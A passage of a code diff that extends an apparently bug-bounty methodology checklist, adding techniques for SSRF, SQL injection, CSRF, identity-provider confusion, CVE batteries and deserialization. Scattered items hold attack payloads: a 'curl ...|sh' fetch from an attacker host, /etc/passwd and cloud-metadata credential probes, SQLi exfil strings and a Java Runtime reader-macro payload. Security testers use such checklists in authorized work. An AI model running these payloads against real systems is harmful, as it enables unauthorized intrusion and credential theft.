@@ -418,9 +418,10 @@ const CHECKLIST = [
 			"LFI probe: qsreplace /etc/passwd + match root:x:0:0; SSRF: qsreplace 169.254.169.254/latest/meta-data/ + match ami-id",
 			"AXFR check: dig AXFR <domain> @<NS> -> '[CRITICAL] AXFR SUCCESS'; SPF +all -> email spoofing; DMARC p=none -> HIGH",
 			"Wildcard DNS probe: query random labels (openssl rand -hex 8) — all resolve to the same IP = wildcard zone; use IP-set cardinality to choose body-hash dedup",
-			"High-value management port list: 9200/9300 ES, 27017 Mongo, 6379 Redis, 5432 PG, 3306 MySQL, 11211 Memcached, 5984 CouchDB, 1521 Oracle, 1433 MSSQL, 8500 Consul, 4040/6066/7077 Spark, 8086 InfluxDB, 5601 Kibana, 15672 RabbitMQ, 8161 ActiveMQ, 9000 SonarQube/Portainer, 3000 Grafana, 8081 Jenkins, 7474 neo4j, 9090 Prometheus, 8888 Jupyter, 9870/50070 Hadoop, 2375/2376/4243 Docker, 6443/10250 k8s, 28017 Mongo-http, 8443, 50000 DB2/SAP, 5985/5986 WinRM, 5900-5902 VNC, 5701 Hazelcast (raw-TCP custom auth — see deserialization), 4848 GlassFish admin, 7001/7002 WebLogic, 8009 AJP; honeypot triage nmap --script=http-honeypot; 'filtered' != closed — re-test from another region"
+			"High-value management port list: 9200/9300 ES, 27017 Mongo, 6379 Redis, 5432 PG, 3306 MySQL, 11211 Memcached, 5984 CouchDB, 1521 Oracle, 1433 MSSQL, 8500 Consul, 4040/6066/7077 Spark, 8086 InfluxDB, 5601 Kibana, 15672 RabbitMQ, 8161 ActiveMQ, 9000 SonarQube/Portainer, 3000 Grafana, 8081 Jenkins, 7474 neo4j, 9090 Prometheus, 8888 Jupyter, 9870/50070 Hadoop, 2375/2376/4243 Docker, 6443/10250 k8s, 28017 Mongo-http, 8443, 50000 DB2/SAP, 5985/5986 WinRM, 5900-5902 VNC, 5701 Hazelcast (raw-TCP custom auth — see deserialization), 4848 GlassFish admin, 7001/7002 WebLogic, 8009 AJP; honeypot triage nmap --script=http-honeypot; 'filtered' != closed — re-test from another region",
+			"Active SMTP open-relay verification (only when the passive DNS audit flags spoofable posture): banner-grab the MX + submission ports with swaks --server <mx> --port 25 (and 587/465), then attempt an unauthenticated send of a benign test mail to an EXTERNAL recipient, watching for 250-accepted vs 550/530-rejected; open relay = mail from any sender relayed to any recipient; 25/587 auth-less submission accepted = spoofable relay — passive SPF/DMARC findings are stale without this active confirmation"
 		],
-		techniques: ["bb_probe_http", "bb_recon", "ffuf", "dirsearch", "katana", "alterx", "dnsx", "naabu", "masscan", "gau", "arjun", "LinkFinder", "SecretFinder", "subzy", "sqlmap", "qsreplace"]
+		techniques: ["bb_probe_http", "bb_recon", "ffuf", "dirsearch", "katana", "alterx", "dnsx", "naabu", "masscan", "gau", "arjun", "LinkFinder", "SecretFinder", "subzy", "sqlmap", "qsreplace", "swaks open-relay check"]
 	},
 	{
 		slug: "idor-bac",
@@ -469,9 +470,11 @@ const CHECKLIST = [
 			"IP-encoding arsenal to dodge filters: decimal http://2130706433 (127.0.0.1), octal http://0177.0.0.1, hex http://0x7f000001, short forms http://127.1 / http://0 / http://0.0.0.0, IPv6-mapped [::ffff:127.0.0.1], mixed 0x7f.1",
 			"Non-HTTP request-tool chains raise impact beyond plain fetch: git/curl/wget/ffmpeg/convert/wkhtmltopdf — e.g. git clone with --upload-pack=curl example.com|sh https://attacker/repo.git = code exec on the fetch host",
 			"Cloud metadata matrix on ANY SSRF (AWS first): IMDSv1 http://169.254.169.254/latest/meta-data/iam/security-credentials/<role> AND IMDSv2 token-grab PUT /latest/api/token + X-aws-ec2-metadata-token-ttl-seconds:21600; GCP /computeMetadata/v1/?recursive=true&alt=json + Metadata-Flavor: Google; Azure /metadata/instance?api-version=2021-02-01 + Metadata: true",
-			"OOB validation discipline: sub-tag the collaborator domain per sink (import.<collab>, webhook.<collab>, dlsrc.<collab>) so callbacks identify the exact firing path"
+			"OOB validation discipline: sub-tag the collaborator domain per sink (import.<collab>, webhook.<collab>, dlsrc.<collab>) so callbacks identify the exact firing path",
+			"Intended-fetch triage gate: classify the fetch feature's PUBLIC purpose before reporting — image proxying / media libraries / URL-preview are intended behavior; an external-domain fetch alone is NOT a finding — require internal reach (RFC1918/metadata), SSRF-into-state-change (write to internal API), or exfil proof, else drop",
+			"Presigned-URL / server-side-signing object-key injection: attacker-chosen path (s3_path, key) passed into server-side S3 signing — control the key prefix to point the signed URL at another tenant's object or an arbitrary S3 path"
 		],
-		techniques: ["bb_wayback_urls (find url params)", "interactsh", "dns rebinding", "metadata endpoints"]
+		techniques: ["bb_wayback_urls (find url params)", "interactsh", "dns rebinding", "metadata endpoints", "intended-fetch triage", "signed-URL key injection"]
 	},
 	{
 		slug: "auth-session",
@@ -541,9 +544,10 @@ const CHECKLIST = [
 			"Per-DB OOB exfil: MSSQL xp_dirtree, Oracle UTL_HTTP.REQUEST / DBMS_LDAP.INIT, PostgreSQL COPY ... TO PROGRAM (RCE-tier) or dblink_connect, MySQL LOAD_FILE('\\\\<collab>\\x')",
 			"ORDER BY injection (un-parameterizable column, most WAFs miss it): sort=(CASE WHEN (SELECT version() LIKE 'PostgreSQL%') THEN 1 ELSE (SELECT 1 UNION SELECT 2) END)",
 			"Header-based second-order: User-Agent: ' AND SLEEP(5)-- — bypasses parameter-focused WAF rules because headers are treated as trusted server metadata",
-			"Statistical timing proof (false-positive killer): run 10 baseline + 10 injected requests; mean injected time must exceed mean baseline by >= the sleep duration AND stddev < sleep/3 — a single slow response is not proof"
+			"Statistical timing proof (false-positive killer): run 10 baseline + 10 injected requests; mean injected time must exceed mean baseline by >= the sleep duration AND stddev < sleep/3 — a single slow response is not proof",
+			"Boolean-blind binary-search extraction protocol: establish a body-content oracle (true = matching row count / distinctive body marker), then binary-search ASCII per character (name > 'm' style) — 7 probes/char with a stable oracle, not 255"
 		],
-		techniques: ["sqlmap", "burp intruder", "error fingerprinting", "WAF bypass"]
+		techniques: ["sqlmap", "burp intruder", "error fingerprinting", "WAF bypass", "boolean-blind binary-search oracle"]
 	},
 	{
 		slug: "business-logic",
@@ -557,9 +561,11 @@ const CHECKLIST = [
 			"Privilege flows: order status transitions, referral abuse, loyalty manipulation",
 			"Price manipulation (client-provided price), negative quantity, integer overflow quantity:9999999999",
 			"Coupon stacking + parallel single-use coupon race; remove item after discount",
-			"Multi-step workflow state-token bypass; limited-quantity item races"
+			"Multi-step workflow state-token bypass; limited-quantity item races",
+			"Deleted-entity lifecycle regression: soft-deleted/archived objects keep their side effects — deleted user still receives email notifications, removed payment method still charges, cancelled subscription still renews, removed member still holds API access — enumerate lifecycle endpoints (cancel, archive, remove, revoke) and re-check the entity's downstream behavior after each state transition",
+			"Enum value-range diffing: enumerate every enum/state field's accepted values client-side (swagger enums, JS constants) vs server-side implementation — values the doc declares but the server never validates, and values the server accepts that the client never offers — a status='suspended' flag or gift_code_state accepted server-side that the UI can't set is a privilege/business-rule gap"
 		],
-		techniques: ["burp turbo intruder", "race condition patterns", "negative value fuzzing"]
+		techniques: ["burp turbo intruder", "race condition patterns", "negative value fuzzing", "lifecycle state-transition sweeps", "enum brute-vs-implemented diff"]
 	},
 	{
 		slug: "api-misconfig",
@@ -632,9 +638,10 @@ const CHECKLIST = [
 			"SameSite bypass: top-level GET navigation, subdomain-signed cookies, JSON content-type CSRF",
 			"Open redirect: ?url= ?next= ?redirect= ?return= accepting //evil.com, \\\\evil.com, javascript:, encoded variants",
 			"Chain open redirects into OAuth token/state leakage, SSRF via 302-to-internal, or credential phishing",
-			"Signature/path-verification hijack: path traversal in a signature/verification param whose verified path is later re-requested with a DIFFERENT method (GET-verified path re-requested as DELETE) = arbitrary-method state-changing CSRF"
+			"Signature/path-verification hijack: path traversal in a signature/verification param whose verified path is later re-requested with a DIFFERENT method (GET-verified path re-requested as DELETE) = arbitrary-method state-changing CSRF",
+			"Destructive-action re-auth: password change, 2FA disable, API-key revoke, backup delete, and account-deletion endpoints must re-prompt for credentials/re-auth — if the destructive action rides on the ambient session cookie alone, it is CSRF-able from any cross-origin top-level navigation"
 		],
-		techniques: ["SameSite=lax bypass", "CORS audit", "OAuth redirect chain", "bb_wayback_urls (find redirect params)", "signature param method-flip CSRF"]
+		techniques: ["SameSite=lax bypass", "CORS audit", "OAuth redirect chain", "bb_wayback_urls (find redirect params)", "signature param method-flip CSRF", "destructive action re-auth check"]
 	},
 	{
 		slug: "file-upload",
@@ -772,9 +779,10 @@ const CHECKLIST = [
 			"SSRF via Host with internal hostnames like internal-service.local; look for internal API or metadata responses",
 			"Try special chars, encoded values and path traversal (target.com%00.attacker.com, %74%61%72%67%65%74.com, ../../attacker.com); look for parser errors",
 			"Full header set: Host: attacker.com / X-Forwarded-Host: attacker.com / X-Host: attacker.com / X-Forwarded-Server: attacker.com / dual-Host smuggling 'Host: target.com\\r\\nHost: attacker.com'",
-			"False-positive killer: many apps put attacker.com in the email but the actual link domain is server-pinned — READ the actual email (OOB confirm via controlled inbox/Collaborator), do not infer from the reflected header"
+			"False-positive killer: many apps put attacker.com in the email but the actual link domain is server-pinned — READ the actual email (OOB confirm via controlled inbox/Collaborator), do not infer from the reflected header",
+			"<base href> tag hijack: if a page builds <base href> from the Host/X-Forwarded-Host header, forging the Host makes ALL relative assets (JS/CSS/images) resolve to the attacker's origin — verify the attacker domain receives the subsequent relative-asset requests"
 		],
-		techniques: ["X-Forwarded-Host reset/redirect poisoning", "ffuf Host: FUZZ wordlist", "duplicate Host / absolute URL", "header-based SQLi/XSS payloads"]
+		techniques: ["X-Forwarded-Host reset/redirect poisoning", "ffuf Host: FUZZ wordlist", "duplicate Host / absolute URL", "header-based SQLi/XSS payloads", "base-tag hijack"]
 	},
 	{
 		slug: "rate-limit",
@@ -815,9 +823,10 @@ const CHECKLIST = [
 			"Check alternate subdomains/ports and Wayback snapshots of the restricted path; look for public copies or misconfigured twins",
 			"Automate with ffuf 403 header+URL payload wordlists, verifying every hit by content length and body (4-ZERO-3 style); look for false positives",
 			"Complete auth-bypass header list: X-Forwarded-For, X-Real-IP, X-Originating-IP, X-Remote-IP, X-Remote-Addr, X-Client-IP, X-Host, X-Forwarded-Host, X-Original-URL, X-Rewrite-URL, X-Custom-IP-Authorization, True-Client-IP, Cluster-Client-IP, CF-Connecting-IP (brute with ffuf -H 'FUZZ: 127.0.0.1' -w headers.txt)",
-			"Vhost brute via Host header: ffuf -u https://$TARGET/ -H 'Host: FUZZ.example.com' -w subdomains-top1million-110000.txt -mc 200,301,302 -fs 0"
+			"Vhost brute via Host header: ffuf -u https://$TARGET/ -H 'Host: FUZZ.example.com' -w subdomains-top1million-110000.txt -mc 200,301,302 -fs 0",
+			"Proxy-vs-backend path-normalization differential: send the SAME path in forms the two layers normalize differently (//admin, /%2fadmin, /%2Fadmin, /./admin, /admin%2F.., //server/..//admin) — a WAF/ALB/ASGI front-end and a backend router often disagree; whichever layer checks auth first becomes bypassable when the other layer resolves the path to the protected resource"
 		],
-		techniques: ["method switching + --path-as-is", "X-Original-URL/X-Rewrite-URL header spoofing", "4-ZERO-3 wordlists", "ffuf 403 payload automation", "HTTP/1.0 downgrade"]
+		techniques: ["method switching + --path-as-is", "X-Original-URL/X-Rewrite-URL header spoofing", "4-ZERO-3 wordlists", "ffuf 403 payload automation", "HTTP/1.0 downgrade", "proxy-vs-backend normalization diff"]
 	},
 	{
 		slug: "email-field",
@@ -833,9 +842,10 @@ const CHECKLIST = [
 			"User enumeration via registration/reset response differences for known emails; look for differential error messages",
 			"Unicode homograph emails (Cyrillic 'a'); look for accepted visually-similar addresses",
 			"CSV/log injection (formula payloads, \\n) in email exports and logs; look for formula execution in spreadsheets",
-			"Rate-limit reset/registration; look for missing throttling and token brute-forceability"
+			"Rate-limit reset/registration; look for missing throttling and token brute-forceability",
+			"Outbound HTML-rendering sink audit: map which attacker-controllable fields (name, company, job title, invoice amount, order notes) flow into transactional email templates rendered as HTML by the ESP (HubSpot/SendGrid/Mandrill/SES) — register/victim-side values entering <a href>, <img src>, or unescaped body text in outbound mail is stored XSS that fires in any HTML-capable mail client; check both plain-text and HTML multipart variants, and confirm the ESP does not re-escape after template substitution"
 		],
-		techniques: ["RFC822 edge-case battery", "OAST domain as email domain", "CRLF header injection in emails", "unicode homograph emails", "differential user enumeration"]
+		techniques: ["RFC822 edge-case battery", "OAST domain as email domain", "CRLF header injection in emails", "unicode homograph emails", "differential user enumeration", "transactional-email HTML sink audit"]
 	},
 	{
 		slug: "mass-assignment",
@@ -937,9 +947,11 @@ const CHECKLIST = [
 			"WordPress playbook: xmlrpc.php brute-force WAF bypass + pingback SSRF, REST user enum, admin-ajax.php actions after a subscriber account = plugin escalation",
 			"Rails playbook: YAML deserialization (old psych), strong-params misses -> mass assignment, SECRET_KEY_BASE leak -> session forging, send_file path traversal",
 			"Atlassian Data Center playbook: WebWork/OGNL endpoint matrix — POST /pages/doenterpagevariables.action (CVE-2021-26084, untrusted linkCreation=... param, pre-auth), /signup.action?token= (unauth when self-signup is on), /users/darkfeatures.action?featureKey= (auth), /pages/docreatepagefromtemplate.action?newSpaceKey=<space>&sourceTemplateId= (auth, patched 7.12.14/7.13.8/7.14.8 — test below these); pair with the Hazelcast 5701 cluster plane (see deserialization)",
-			"Oracle Forms legacy-CVE line: WebUtil_* param battery — WebUtil_Run_Class, WebUtil_Cluster_Class, WebUtil_Cluster_Server, WebUtil_Cluster_Fig, WebUtil_Obj_Security, WebUtil_Logger_File, WebUtil_Enable_Internals (RCE / cluster abuse, late-1990s WebUtil still shipping on enterprise Forms deployments)"
+			"Oracle Forms legacy-CVE line: WebUtil_* param battery — WebUtil_Run_Class, WebUtil_Cluster_Class, WebUtil_Cluster_Server, WebUtil_Cluster_Fig, WebUtil_Obj_Security, WebUtil_Logger_File, WebUtil_Enable_Internals (RCE / cluster abuse, late-1990s WebUtil still shipping on enterprise Forms deployments)",
+			"Nginx range-filter CVE-2017-7529 battery (old nginx on consumer-router firmware / embedded appliances): send Range headers crossing the 0x8000000000000000 overflow boundary (e.g. Range: bytes=-X with huge or -1728989259139571198-style arithmetic) against a cached static resource — 206 with leaked adjacent cache-file bytes = the flaw; fingerprint nginx version first (Server header, /nginx.conf error pages) since modern 1.12.1+/1.13.3+ patched it",
+			"Consumer-router / embedded firmware CVE battery: fingerprint the appliance (login portal, JS bundle, favicon hash) then cross-reference its bundled-service versions — old nginx/lighttpd/boa, BusyBox httpd, unpatched php 5.x, iptables-web shells — e.g. Zyxel/TP-Link/ASUS-era admin panels with known pre-auth RCEs; vendor EoL devices never get patched, so confirmed CVEs are Critical regardless of the device's age"
 		],
-		techniques: ["x-middleware-subrequest + x-middleware-rewrite probes", "coffinxp nuclei-templates (nextjs-middleware-cache.yaml)", "Grafana icon_hash 2123863676 / title dorks", "CVE-2025-29927 / CVE-2025-4123 nuclei templates", "Atlassian OGNL endpoint matrix", "Oracle Forms WebUtil battery"]
+		techniques: ["x-middleware-subrequest + x-middleware-rewrite probes", "coffinxp nuclei-templates (nextjs-middleware-cache.yaml)", "Grafana icon_hash 2123863676 / title dorks", "CVE-2025-29927 / CVE-2025-4123 nuclei templates", "Atlassian OGNL endpoint matrix", "Oracle Forms WebUtil battery", "nginx Range overflow CVE-2017-7529", "firmware appliance CVE cross-ref"]
 	},
 	{
 		slug: "github-recon",
@@ -1287,9 +1299,10 @@ const CHECKLIST = [
 			"Look for the serialization surface first: /api/objects?format=json vs format=java, XML-RPC endpoints (wordpress xmlrpc, WebLogic wls-wsat), JSF ViewState, session serialized in cookies (PHPSESSID base64-decodes to PHP object)",
 			"Cookie/header magic bytes: rO0 (Java), O: (PHP object injection, e.g. O:8:\"stdClass\" no-error probe), pickle \\x80\\x04",
 			"Custom-protocol/cluster deserialization: Hazelcast 5701 raw-TCP with custom auth handshake — check the group name, send magic header 0xFFFF 0xFF9C, then ysoserial CommonsBeanutils1 (CVE-2022-26133 Bitbucket, CVE-2016-10750); cluster planes often exposed beyond the HTTP surface (see framework-cves)",
-			"SSRS ReportViewer ViewState params NavigationCorrector$PageState / NavigationCorrector$ViewState (CVE-2020-0618 RCE) — .NET deserialization via report viewer"
+			"SSRS ReportViewer ViewState params NavigationCorrector$PageState / NavigationCorrector$ViewState (CVE-2020-0618 RCE) — .NET deserialization via report viewer",
+			"Lisp/EDN deserialization: clojure.core/read-string on user input executes reader macros — probe with (def x ...), #=(java.lang.Runtime/getRuntime ...) or (import ...) payload grammar; EDN consumers that use read-string instead of edn/read-string are the bug (NASA CMR class)"
 		],
-		techniques: ["ysoserial chain battery", "ysoserial.net ViewState", "pickle __reduce__", "phpggc object injection", "JNDI Log4Shell", "0xaced/ViewState detection", "Hazelcast 5701 auth-handshake chain", "SSRS CVE-2020-0618 ViewState"]
+		techniques: ["ysoserial chain battery", "ysoserial.net ViewState", "pickle __reduce__", "phpggc object injection", "JNDI Log4Shell", "0xaced/ViewState detection", "Hazelcast 5701 auth-handshake chain", "SSRS CVE-2020-0618 ViewState", "Clojure read-string reader macro"]
 	},
 	{
 		slug: "jwt-attacks",
@@ -1407,6 +1420,20 @@ const CHECKLIST = [
 		techniques: ["redirect_uri differential", "state/PKCE CSRF", "token re-exchange", "SAML XSW injection", "SAML signature strip", "legacy-login matrix"]
 	},
 	{
+		slug: "idp-confusion",
+		name: "IdP / Identity-Provider Confusion",
+		description: "Apps that accept multiple identity providers and confuse WHICH IdP authenticated a given login: cross-IdP account linking without ownership proof, provider/issuer fields trusted from the client, and first-vs-last IdP-wins session binding.",
+		checks: [
+			"Cross-IdP account-linking without proof: register the victim's email on a DIFFERENT supported IdP (Google vs GitHub vs Apple vs Microsoft) — if the app merges/links accounts by verified email alone, the attacker claims the victim account; test every IdP pair and check whether the app re-verifies ownership of the EXISTING account before linking",
+			"Client-supplied provider/issuer: an OAuth callback that reads which IdP authenticated from a client-controlled value (idp=, provider=, auth_type= param echoed into the token/session) — replay your own IdP token while claiming idp=<victim's-provider> and watch the app mis-assign identity",
+			"Issuer/audience trust: an app federating with MULTIPLE IdPs (Google + Okta + ADFS + GitHub) that accepts any valid assertion from any federated partner — mint/obtain an assertion from the WEAKEST partner (e.g. your own GitHub or a free Okta dev tenant) with your email and see if the app treats it as same-user; check issuer whitelisting, audience restriction and NameID scoping per partner",
+			"Session IdP-switching: while signed in via IdP-A, complete a login flow via IdP-B (same or different email) — does the session rebind to B silently, keep A's privileges, or split into two parallel sessions; also test IdP sign-out not propagating to the app session (zombie session after IdP revocation)",
+			"Provider-confusion via shared OAuth app: same client_id reused across provider buttons (GitHub client_id serving the 'Sign in with Google' button) — exchange your GitHub code through the Google-labeled flow and check whether the profile fields (email, profile picture) are attributed to the wrong provider, enabling impersonation on apps that display the provider badge",
+			"Email-verified-flag trust: an IdP that returns email without verified:true (some legacy/SAML partners) — if the app treats any returned email as verified and auto-links, register an unverified email on the weak IdP to claim it"
+		],
+		techniques: ["cross-IdP link matrix", "provider param tampering", "multi-IdP issuer trust test", "IdP-switch session binding", "shared client_id confusion", "email verified-flag trust"]
+	},
+	{
 		slug: "mfa-2fa-bypass",
 		name: "MFA / 2FA Bypass",
 		description: "Factor downgrade, skip-step, OTP replay/brute, prefix-oracle, concurrent sliding-window bypass, fallback-factor abuse. Auth is only as strong as its weakest factor path.",
@@ -1462,9 +1489,10 @@ const CHECKLIST = [
 			"JWT-as-session: logout/password-change only clears the client-side cookie, server keeps validating the stateless JWT; no jti-based revocation",
 			"Cookie flags + scope: Secure/HttpOnly/SameSite on session cookies (bb_security_headers audits); session cookie scoped .company.com (wildcard) instead of the host",
 			"Fixation test: set a known session cookie, login, then check whether the server reused YOUR value; also session-pool: after logout try all previously issued session IDs from the same IP",
-			"Proof discipline: validate with attacker-A + victim-B sessions, body-diff every 200, OOB confirmation for theft chains; standalone attribute gaps are Low/Informational — only lifecycle breaks are High/Critical"
+			"Proof discipline: validate with attacker-A + victim-B sessions, body-diff every 200, OOB confirmation for theft chains; standalone attribute gaps are Low/Informational — only lifecycle breaks are High/Critical",
+			"Security-event session invalidation: 2FA enrollment/disable, biometric or device-factor change, email/password change and ADMIN-LEVEL events must kill ALL pre-existing sessions — enroll 2FA in browser A, replay session A's token in browser B (still valid = gap); mobile: fingerprint/biometric re-enrollment must re-prompt auth on every surface"
 		],
-		techniques: ["logout survival", "password-change survival", "fixation compare", "refresh rotation", "JWT revocation gap", "two-session body-diff"]
+		techniques: ["logout survival", "password-change survival", "fixation compare", "refresh rotation", "JWT revocation gap", "two-session body-diff", "2FA-enrollment session kill"]
 	},
 	{
 		slug: "source-leak",
@@ -1478,9 +1506,10 @@ const CHECKLIST = [
 			"Asset manifests: /asset-manifest.json lists ALL chunk paths (CRA), enabling targeted map fetches; /service-worker.js precache list similarly leaks file inventory",
 			"Severity gate: .env with credentials = Critical; source map with secrets = High; robots.txt only = Informational; NOTE to client: redeploying doesn't fix map exposure — only GENERATE_SOURCEMAP=false + CDN purge does",
 			"X-Debug-Token header = Symfony profiler exposed — open /_profiler/<token> paths",
-			"HTML comments: TODO-remove-before-prod, credentials/paths in comments; actuator alt paths when /actuator is blocked (/actuator/env, /env, /health)"
+			"HTML comments: TODO-remove-before-prod, credentials/paths in comments; actuator alt paths when /actuator is blocked (/actuator/env, /env, /health)",
+			"Beyond .git: .svn exposure — /.svn/entries (working-copy paths), /.svn/wc.db (SQLite with original file contents), /.svn/text-base/ + pristine/ checksum files — full source recovery from an exposed .svn tree"
 		],
-		techniques: ["bb_source_leak_scan", "quick-win path loop", ".js.map rotation", "git-dumper + trufflehog", "asset-manifest inventory", "build-info CVE targeting"]
+		techniques: ["bb_source_leak_scan", "quick-win path loop", ".js.map rotation", "git-dumper + trufflehog", "asset-manifest inventory", "build-info CVE targeting", ".svn wc.db recovery"]
 	},
 	{
 		slug: "shadow-api",
@@ -1637,9 +1666,10 @@ const CHECKLIST = [
 			"SSRF -> IMDS: AWS 169.254.169.254/latest/meta-data/iam/security-credentials/, IMDSv2 token-grab, GCP metadata.google.internal + Metadata-Flavor: Google, Azure 169.254.169.254/metadata/instance — see ssrf",
 			"GCP storage XML listing; Firestore REST firestore.googleapis.com/v1/projects/<p>/databases/(default)/documents/<col>",
 			"Azure AD user enumeration IfExistsResult 0=exists 1=not-exists; Azure Function App URLs unauth",
-			"Dangling DNS provider registrars: *.s3.amazonaws.com, *.herokuapp.com, *.ghost.io, *.azurewebsites.net"
+			"Dangling DNS provider registrars: *.s3.amazonaws.com, *.herokuapp.com, *.ghost.io, *.azurewebsites.net",
+			"Shared-storage ACL battery (Drive/SharePoint/OneDrive/Box sync-shared folders): test each ACL mode an org commonly mis-sets — 'anyone with the link can EDIT' (delete/replace shared files, upload same-named malware into the trusted share), 'anyone can COMMENT' (phish bait living inside org-shared docs), external-share expiry disabled, and per-folder ACL inheritance breaks that expose archived/legal files; delete/replace capability must be proven, not just read"
 		],
-		techniques: ["registry image pull", "GCS/Azure-blob anon", "48-pattern secret catalog", "sts get-caller-identity", "Cognito unauth role", "IMDS matrix"]
+		techniques: ["registry image pull", "GCS/Azure-blob anon", "48-pattern secret catalog", "sts get-caller-identity", "Cognito unauth role", "IMDS matrix", "shared-drive anyone-with-link ACL"]
 	},
 	{
 		slug: "k8s-docker",
@@ -1665,9 +1695,12 @@ const CHECKLIST = [
 			"M365/Entra (see bb_entra_tenant_probe): getuserrealm.srf login=<user>@<domain>&xml=1 -> NameSpaceType Managed (ROPC works) vs Federated (ADFS); AADSTS {53003,50076,50079,50158,530003} = PASSWORD VALID — STOP; 50053 = Smart Lockout (10 fails, 60s start); ROPC /common/oauth2/token + GetCredentialType AADSTS1659001 split = user enum",
 			"Okta: /api/v1/authn POST {'username','password'} — 401 E0000004 invalid / E0000119 locked / 200 = MFA prompt (cred VALID); tenant DNS <t>.okta.com / okta-emea.com; captured Okta admin creds mint arbitrary signed SAML for every federated app",
 			"SharePoint: fingerprint headers SPRequestGuid, MicrosoftSharePointTeamServices, X-SharePointHealthScore; _vti_bin/Authentication.asmx Login SOAP op accepts native Forms creds anonymously with no rate limit; ToolShell /_layouts/15/ToolPane.aspx?DisplayMode=Edit + anonymous __REQUESTDIGEST + unencrypted ViewState (CVE-2025-53770/53771, present in SP2013, never fixed); EoL: SP2013 CVEs after 2023-04 are permanently unpatched",
-			"Doctrine: management-plane CVEs are pre-auth, network-reachable, mass-exploited within days — Critical same-day callout; capture baseline, and if the appliance PATCHES mid-test, capture the patched state as a SECOND finding (see engagement)"
+			"Doctrine: management-plane CVEs are pre-auth, network-reachable, mass-exploited within days — Critical same-day callout; capture baseline, and if the appliance PATCHES mid-test, capture the patched state as a SECOND finding (see engagement)",
+			"Atlassian Jira anonymous-access surface: /secure/QueryComponent!Default.jspa (CVE-2020-14179) + Filter REST with x-ausername: anonymous header, numeric-ID org/group enumeration via public issue fields — anonymous-only endpoints that leak user/org metadata",
+			"Self-hosted GitLab unauth battery: /users filter-param bypass when the base API 403s (e.g. /users?search=...), /users/:id/keys (public SSH keys), snippets, project registries, /-/metadata, /api/v4/projects?simple=true&membership=false — derive infra/PII from public keys and metadata",
+			"Keycloak realm default-credential battery: default admin/admin, /auth/realms/master/.well-known/openid-configuration realm enumeration, user-registration-open realms with default roles"
 		],
-		techniques: ["bb_vpn_fingerprint", "bb_entra_tenant_probe", "vCenter CVE matrix", "VPN cookie fingerprints", "AADSTS password-valid codes", "SharePoint ToolShell"]
+		techniques: ["bb_vpn_fingerprint", "bb_entra_tenant_probe", "vCenter CVE matrix", "VPN cookie fingerprints", "AADSTS password-valid codes", "SharePoint ToolShell", "Jira anonymous REST", "GitLab unauth filter bypass", "Keycloak realm defaults"]
 	},
 	{
 		slug: "cicd-supply-chain",
@@ -1697,9 +1730,14 @@ const CHECKLIST = [
 			"OWASP Smart Contract Top 10: access control ($953M lost 2024), business logic, oracle manipulation, flash loans, input validation, unchecked external calls, arithmetic, reentrancy ($35.7M), proxy/upgradeability",
 			"2024-25 classes: ERC4626 near-empty vault inflation, EIP-2612 permit frontrun DoS, signature replay across chains (recheck chainId in ecrecover), ZK proof-verifier bypass, if-vs-require modifier, donation attack, deploy-script/initializer re-init",
 			"Target scorecard >= 6/10 quality gate; hard kill signals: unverified contract, deployer rug history, <30 min contract age",
-			"8-class token rug grid: hidden mint (function mint/_mint/_balances[.]+=, delegatecall), honeypot (blacklist/isBlacklisted/maxTxAmount), fee manipulation (setFee/setSellFee/_isExcludedFromFee), LP drain (migrateLP/emergencyWithdraw/.sync()/setPair), bonding curve (virtualReserve/setCurve/graduate), authority retention (mint_authority/freeze_authority, is_mutable), fake renounce (renounceOwnership.*override/_shadowAdmin), sandwich/MEV (swapExactTokensForETH amountOutMin=0/rebase)"
+			"8-class token rug grid: hidden mint (function mint/_mint/_balances[.]+=, delegatecall), honeypot (blacklist/isBlacklisted/maxTxAmount), fee manipulation (setFee/setSellFee/_isExcludedFromFee), LP drain (migrateLP/emergencyWithdraw/.sync()/setPair), bonding curve (virtualReserve/setCurve/graduate), authority retention (mint_authority/freeze_authority, is_mutable), fake renounce (renounceOwnership.*override/_shadowAdmin), sandwich/MEV (swapExactTokensForETH amountOutMin=0/rebase)",
+			"Oracle-integity audit beyond TWAP: Chainlink price feeds — roundId < 50 (stale/early rounds), stale updatedAt vs heartbeat window, price-of-last-round off-by-one between feeds, sequencer uptime feed for L2s; a circuit-breaker must exist for each oracle path",
+			"Liquidation/bad-debt reconciliation invariants: liquidatee paying their own collateral twice (2x private-collateral liquidation), collateral-factor chaining across assets, totalBadDebtETH balance-sheet drift that bricks fee withdrawal, share-math precision loss and guard-DoS in reward accrual",
+			"Reentrancy-guard state-machine audit: guard flag must be reset by the EXACT call path (a reset in receive()/fallback re-arms the guard mid-flight); CEI analysis must include the guard's lifecycle, not just external-call ordering",
+			"Formal-verification methodology (Certora/KEVM): write rules + ghost functions asserting invariants, run the prover, and treat rule failures as real bugs — a single mutated rule can find what manual review misses; mutation-scoring the rule set proves rule quality",
+			"CDP/lending protocol internals: same-transaction oracle price flips (twap update + borrow in one tx) -> flash-loan arbitrage, redemption/RM gate asymmetry, sorted-list order-break + hint front-running (SortedCdps), batch-liquidation bad-debt redistribution staleness, fee-split rounding drift"
 		],
-		techniques: ["TVL/audit kill gates", "mint/permanent_delegate rug", "reward invariant greps", "reentrancy/oracle checks", "Foundry forge test PoC", "proxy initialize bypass"]
+		techniques: ["TVL/audit kill gates", "mint/permanent_delegate rug", "reward invariant greps", "reentrancy/oracle checks", "Foundry forge test PoC", "proxy initialize bypass", "oracle circuit-breaker audit", "liquidation invariant battery", "reentrancy-guard lifecycle", "Certora formal verification", "CDP sorted-list invariants"]
 	},
 	{
 		slug: "offensive-osint",
@@ -1787,9 +1825,12 @@ const CHECKLIST = [
 			"Host-permission abuse: extension with host_permissions on *://* combined with any messaging API (chrome.tabs.query + sendMessage, externally_connectable) — test a known public page for read/execute; flag overly-broad host_permissions+IDs in manifest review",
 			"Desktop-client shell-built commands: config/state files in user-writable dirs whose string values (command, server, cert path) are interpolated into child_process.exec/spawn or sudo — write a crafted value, reload client, confirm execution; check sudo-wrapper helpers for LPE (config-controlled command run as root)",
 			"VPN kill-switch leak testing: for each protocol/port (OpenVPN, WireGuard, IKEv2, RDP 3389, SMB 445), set test traffic and BREAK the tunnel — check whether traffic leaks outside the tunnel with packet capture as evidence (tcpdump/tshark) before and after failure",
-			"Native-messaging host verification: extension -> native host name match, path to the host binary, and that the host validates the extension ID before accepting messages"
+			"Native-messaging host verification: extension -> native host name match, path to the host binary, and that the host validates the extension ID before accepting messages",
